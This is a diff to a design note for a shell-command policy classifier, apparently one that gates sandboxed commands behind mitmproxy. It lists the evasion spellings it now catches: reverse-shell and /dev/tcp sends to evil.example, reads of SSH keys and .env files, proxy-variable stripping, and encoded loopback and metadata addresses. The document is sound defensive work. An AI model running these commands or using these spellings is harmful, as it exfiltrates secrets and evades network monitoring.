@@ -199,22 +199,70 @@ or makes it stricter; none loosens a verdict.
   argument (`nc evil.example 4444`, `ssh evil.example cmd`), which the
   URL/`user@host` host scan does not see. A sender with no allowlisted or
   provider host is now ⛔ row 20 in every mode (an unidentified host is not
-  allowlisted), instead of falling through to row 6. `scp`/`sftp`/`rsync`
-  without a remote `host:` argument stay row 6, since they are local copies.
+  allowlisted), instead of falling through to row 6. Only `scp` and `rsync`
+  without a remote `host:` argument stay row 6, since they have a local-copy
+  form (see the v2 note on `sftp` below).
 - **`/dev/tcp` and `/dev/udp` redirects are an outbound send.** A redirect
   whose target is `/dev/tcp/<host>/<port>` (or `/dev/udp/...`) opens a socket
   that honours no proxy variable and never reaches mitmproxy, so it is judged
-  by its host: row 20 to an unknown host, row 19 to loopback or metadata.
+  by its host: row 20 to an unknown host, row 19 to loopback or metadata. This
+  covers both write (`> /dev/tcp/...`) and input (`exec 3</dev/tcp/...`)
+  redirects (see the v2 note).
 - **A standalone `*_PROXY=` segment is row 18.** A bare `HTTPS_PROXY=`
   statement in its own `;`-separated segment (empty argv) empties the exported
   proxy variable for later commands in the same shell. Assignment-only
   segments are now inspected for proxy and CA variables, at the top level and
   inside `sh -c` / `bash -c` strings, so this reaches the row-18 check.
-- **Loopback is matched in every spelling.** Row 19's `127.0.0.0/8` now covers
-  short, hex and decimal forms (`127.1`, `0x7f000001`, `2130706433`),
-  IPv4-mapped IPv6 (`::ffff:127.0.0.1`) and `*.localhost` (RFC 6761), not just
-  the dotted-quad `127.x.x.x`.
+- **Loopback is matched in short, hex and decimal forms.** Row 19's
+  `127.0.0.0/8` covers `127.1`, `0x7f000001` and `2130706433`, IPv4-mapped
+  IPv6 (`::ffff:127.0.0.1`) and `*.localhost` (RFC 6761), not just the
+  dotted-quad `127.x.x.x`. The v2 pass extends this to octal and
+  zero-padded spellings (see below).
 - **`command -v`/`-V` is read-only.** `command -v rm` and `builtin -V rm`
   resolve a name and run nothing, so they are row 5 instead of inheriting the
   inner verb's row (`command -v rm` is no longer blocked as row 28). A real
-  inner command such as `command rm x` is still classified by its verb.
+  inner command such as `command rm x` is still classified by its verb (the v2
+  pass fixes an inner `-v`, see below).
+
+## Review v2 hardening
+
+The v2 pass closes the spellings the v1 fixes still missed. As before, each is
+in line with the table or stricter; none loosens a verdict.
+
+- **`command ... -v` no longer whitelists the inner verb.** Only
+  `command`/`builtin`'s own leading options count as introspection. `command
+  rm -r -v x` runs `rm` (row 28); `command curl -v -d @f https://e.example`
+  is still row 20. Only `-v`/`-V` before the first non-flag token (`command -v
+  rm`) is read-only.
+- **Input redirects are read paths.** `cat < ~/.ssh/id_rsa` (row 16),
+  `cat < .env` (row 17) and `exec 3</dev/tcp/evil.example/80` (row 20) are
+  classified by the file or socket they open, like a positional path argument.
+- **`>& FILE` is a write.** `echo x >& ~/.zshrc` is a write to a persistence
+  path (row 4a), and `... >& /dev/tcp/host/port` is a send (row 20). Only a
+  numeric target or `-` (`>&2`, `>& -`) stays an fd operation.
+- **`$HOME`, `${HOME}`, `$PWD`, `~user` and globs are expanded.** `$HOME` and
+  `${HOME}` resolve to the real home, `$PWD`/`${PWD}` to the command's working
+  directory, and `~user` through `expanduser`, so `cat $HOME/.ssh/id_rsa` is
+  row 16 and `echo x > $PWD/../policy.py` is row 18. A path token that still
+  contains a glob (`cat ~/.ss?/id_rsa`, `echo x >> ~/.zsh[r]c`) is matched
+  against the credential and persistence paths, and any token left with an
+  unresolved `$` fails closed to row 6.
+- **`sftp` has no local form.** A bare `sftp evil.example` is row 20, like the
+  other bare-host senders; only `scp` and `rsync` keep the local-copy
+  exemption.
+- **ssh and nc options are parsed past the destination.** `ssh <host> -J
+  evil.example` sends the jump host to row 20, `-o ProxyCommand=...` (anywhere,
+  attached or spaced) is row 25 plus the inner command, and `ncat <host> 443
+  -e /bin/sh` is row 25. Value-taking options such as `-l user` are no longer
+  mistaken for the host.
+- **Octal, zero-padded and metadata encodings reach row 19.** IPv4 is parsed
+  with the platform `inet_aton` (so `127.000.000.001`, `0177.0.0.1`,
+  `017700000001` are loopback) and IPv6 with `ipaddress` (so the uncompressed
+  `0:0:0:0:0:0:0:1` and mapped forms are loopback). The metadata endpoint is
+  matched in every numeric spelling (`2852039166`, `0xa9fea9fe`,
+  `::ffff:169.254.169.254`); only `169.254.169.254` is treated as metadata, per
+  the spec.
+- **More proxy-removal spellings are row 18.** `export -n HTTPS_PROXY`,
+  `declare +x HTTPS_PROXY`, `typeset +x HTTPS_PROXY`, `readonly HTTPS_PROXY=`
+  and `env -i` each strip or empty the proxy variable for child processes, so
+  they join `unset` and `env -u` on row 18.
